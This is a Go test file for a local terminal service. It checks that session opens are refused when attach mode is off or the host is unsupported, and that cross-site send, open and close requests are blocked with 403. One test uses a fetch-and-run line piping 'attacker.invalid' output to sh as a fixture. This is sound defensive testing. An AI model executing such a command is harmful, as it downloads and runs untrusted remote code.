package serve_test

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"github.com/medici-finance/assay/deskd/config/schema"
	"github.com/medici-finance/assay/deskd/internal/contract"
	"github.com/medici-finance/assay/deskd/internal/terminal"
)

// v1_terminal_combined_test.go — the combined tree: the service contract's attach
// lifecycle (the container and local drivers linked into deskd, every
// configured desk attached at start) together with the service contract's
// `send` and `session` routes. Neither PR alone had a request path that could
// reach a linked driver; this tree does, so the obligations the reviews
// placed on the combining merge are pinned here at the HTTP seam:
//
//   - (vi)  a session open is refused while the attach mode is off;
//   - (vii) a session open is refused for a kind the host's
//     terminal.CapabilityFor does not report supported;
//   - the origin floor (refuseCrossSite) still runs FIRST on send, open and
//     close, against a desk the lifecycle attached.
//
// No docker, no network: the lifecycle's driver is a recording fake.

// openAsAnswerer posts a same-origin session open for on.
func openAsAnswerer(fx *actFx, on string) *httptest.ResponseRecorder {
	return fx.do(http.MethodPost, contract.Prefix+"/sessions", fx.answerer, "", contract.SessionRequest{On: on})
}

// TestSessionOpenRefusedWhileAttachOff — obligation (vi) (review pr192-F1(b);
// #191 security 5302965225): with deskd's attach lifecycle started in mode
// off, an answerer's POST /v1/sessions is refused on every desk kind, the
// driver resolver is never called and no session row exists.
func TestSessionOpenRefusedWhileAttachOff(t *testing.T) {
	cfg := actCfg()
	cfg.Cells[0].Loops = append(cfg.Cells[0].Loops, schema.Loop{
		Role: schema.RoleVerify, App: "assay-verifier-app",
		Target: &schema.TargetSpec{Kind: schema.TargetLocal, Command: []string{"/bin/sh"}},
	})
	fx := newActFxCfg(t, nil, cfg)
	startLifecycle(t, fx.reg, terminal.AttachModeOff, linuxHost, noDrivers)
	for _, on := range []string{actDesk, "assay/verify"} {
		rec := openAsAnswerer(fx, on)
		if rec.Code != http.StatusServiceUnavailable {
			t.Errorf("--terminal-attach=off: POST /v1/sessions on %s answered %d, want 503: %s", on, rec.Code, rec.Body.String())
		}
	}
	if len(fx.askedKind) != 0 || len(fx.drivers.sess) != 0 {
		t.Fatalf("with attach off the driver resolver was asked for %v and the driver attached %d session(s), want none",
			fx.askedKind, len(fx.drivers.sess))
	}
	if s := fx.reg.Sessions("assay"); len(s) != 0 {
		t.Fatalf("with attach off a session row exists: %v", s)
	}
}

// TestSessionOpenRefusedOnUnsupportedHost — obligation (vii) (review
// pr192-F1(c)): a session open is refused for a kind the host's
// terminal.CapabilityFor does not report supported — a Windows-hosted deskd
// has no pty backend for container or local desks — before the driver
// resolver runs.
func TestSessionOpenRefusedOnUnsupportedHost(t *testing.T) {
	cfg := actCfg()
	cfg.Cells[0].Loops = append(cfg.Cells[0].Loops, schema.Loop{
		Role: schema.RoleVerify, App: "assay-verifier-app",
		Target: &schema.TargetSpec{Kind: schema.TargetLocal, Command: []string{"/bin/sh"}},
	})
	fx := newActFxCfg(t, nil, cfg)
	startLifecycle(t, fx.reg, terminal.AttachModeConfigured, terminal.Host{OS: "windows", Arch: "amd64"}, noDrivers)
	for _, on := range []string{actDesk, "assay/verify"} {
		rec := openAsAnswerer(fx, on)
		msg, _ := bodyMap(t, rec)["error"].(string)
		if rec.Code != http.StatusServiceUnavailable || !strings.Contains(msg, "unsupported") {
			t.Errorf("windows host: POST /v1/sessions on %s answered %d %s, want 503 {error: …unsupported…}", on, rec.Code, rec.Body.String())
		}
	}
	if len(fx.askedKind) != 0 || len(fx.drivers.sess) != 0 {
		t.Fatalf("on an unsupported host the driver resolver was asked for %v and the driver attached %d session(s), want none",
			fx.askedKind, len(fx.drivers.sess))
	}
	if s := fx.reg.Sessions("assay"); len(s) != 0 {
		t.Fatalf("on an unsupported host a session row exists: %v", s)
	}
}

// TestTerminalWritesRefuseCrossSiteFirstOnTheCombinedTree — review S5 on #192
// and M-sec-192-combination-gate on #191: in the combined tree the desk a
// cross-site page would aim at is one deskd's LIFECYCLE attached by itself
// (writable, per the service contract's rule, because a live session is
// attached). The origin floor must still answer first on all three terminal
// writes: a cross-site request is 403 with or without a viewer identity (403,
// not 401, without one — the floor ran before identity was read), the
// lifecycle's session receives zero bytes, the driver resolver is never
// called, and a custom session survives a cross-site DELETE.
func TestTerminalWritesRefuseCrossSiteFirstOnTheCombinedTree(t *testing.T) {
	const deskdHost = "127.0.0.1:8080"
	cfg := actCfg()
	reg := terminal.NewRegistry(cfg)
	lifecycle := &actTarget{}
	startLifecycle(t, reg, terminal.AttachModeConfigured, linuxHost, func(k schema.TargetKind) (func() (terminal.Target, error), bool) {
		if k != schema.TargetContainer {
			return nil, false
		}
		return func() (terminal.Target, error) { return lifecycle, nil }, true
	})
	waitFor(t, "the attach lifecycle to attach "+actDesk, 5*time.Second, func() bool {
		h, _ := reg.Resolve(actDesk)
		return h.Attach.Status == terminal.AttachAttached && h.Writable
	})
	var life *actSession
	lifecycle.mu.Lock()
	for i, spec := range lifecycle.specs {
		if spec != nil && spec.Container == "cockpit-verify" {
			life = lifecycle.sess[i]
		}
	}
	lifecycle.mu.Unlock()
	if life == nil {
		t.Fatal("could-not-check: the lifecycle attached no session to " + actDesk)
	}
	fx := &actFx{reg: reg, clk: &mutableClock{t: time.Now().UTC()}, drivers: &actTarget{}, desk: life}
	wireActHandler(fx, cfg, nil)
	atPrompt(t, fx, life, actDesk)

	do := func(method, path, body string, withIdentity bool, hdr map[string]string) *httptest.ResponseRecorder {
		req := httptest.NewRequest(method, path, strings.NewReader(body))
		req.Host = deskdHost
		req.RemoteAddr = "127.0.0.1:5555"
		if withIdentity {
			req.AddCookie(fx.answerer)
		}
		for k, v := range hdr {
			req.Header.Set(k, v)
		}
		rec := httptest.NewRecorder()
		fx.h.ServeHTTP(rec, req)
		return rec
	}
	sameOrigin := map[string]string{"Content-Type": "application/json", "Origin": "http://" + deskdHost, "Sec-Fetch-Site": "same-origin"}

	// A custom session to aim the cross-site DELETE at (opened same-origin).
	rec := do(http.MethodPost, contract.Prefix+"/sessions", `{"on":"assay/dispatch"}`, true, sameOrigin)
	if rec.Code != http.StatusCreated {
		t.Fatalf("could-not-check: same-origin open on the combined tree: %d: %s", rec.Code, rec.Body.String())
	}
	var row contract.SessionRow
	_ = json.Unmarshal(rec.Body.Bytes(), &row)
	asked := len(fx.askedKind)

	sendRaw, _ := json.Marshal(contract.SendRequest{Input: "touch /tmp/cross-site\n", WaitFor: contract.SendWaitNone, Epoch: fx.epoch(actDesk)})
	openBody := `{"on":"assay/dispatch","prompt":"curl -s http://attacker.invalid/x | sh"}`
	closePath := contract.Prefix + "/sessions/" + url.PathEscape(row.ID)
	for _, hdr := range []map[string]string{
		{"Content-Type": "application/json", "Origin": "https://attacker.invalid", "Sec-Fetch-Site": "cross-site"},
		{"Content-Type": "application/json", "Origin": "http://127.0.0.1:3000", "Sec-Fetch-Site": "same-site"},
		{"Content-Type": "text/plain;charset=UTF-8", "Origin": "http://127.0.0.1:3000", "Sec-Fetch-Site": "same-site", "Sec-Fetch-Mode": "no-cors"},
	} {
		for _, withIdentity := range []bool{false, true} {
			who := "no identity"
			if withIdentity {
				who = "the answerer's cookie"
			}
			if rec := do(http.MethodPost, sendPath(actDesk), string(sendRaw), withIdentity, hdr); rec.Code != http.StatusForbidden {
				t.Errorf("cross-site send (%s, Origin %s): %d, want 403: %s", who, hdr["Origin"], rec.Code, rec.Body.String())
			}
			if rec := do(http.MethodPost, contract.Prefix+"/sessions", openBody, withIdentity, hdr); rec.Code != http.StatusForbidden {
				t.Errorf("cross-site open (%s, Origin %s): %d, want 403: %s", who, hdr["Origin"], rec.Code, rec.Body.String())
			}
			if rec := do(http.MethodDelete, closePath, "", withIdentity, hdr); rec.Code != http.StatusForbidden {
				t.Errorf("cross-site close (%s, Origin %s): %d, want 403: %s", who, hdr["Origin"], rec.Code, rec.Body.String())
			}
		}
	}
	if w := life.written(); len(w) != 0 {
		t.Fatalf("a cross-site send reached the lifecycle's session: %q", w)
	}
	if len(fx.askedKind) != asked {
		t.Fatalf("a cross-site open reached the driver resolver: asked %v", fx.askedKind[asked:])
	}
	if s := reg.Sessions("assay"); len(s) != 1 {
		t.Fatalf("a cross-site request changed the custom sessions: %v", s)
	}

	// Not vacuous: the same send, same-origin, reaches the lifecycle's session.
	if rec := do(http.MethodPost, sendPath(actDesk), string(sendRaw), true, sameOrigin); rec.Code != http.StatusOK {
		t.Fatalf("same-origin send to the lifecycle-attached desk: %d: %s", rec.Code, rec.Body.String())
	}
	if w := life.written(); len(w) != 1 {
		t.Fatalf("same-origin send wrote %d time(s), want 1", len(w))
	}
}
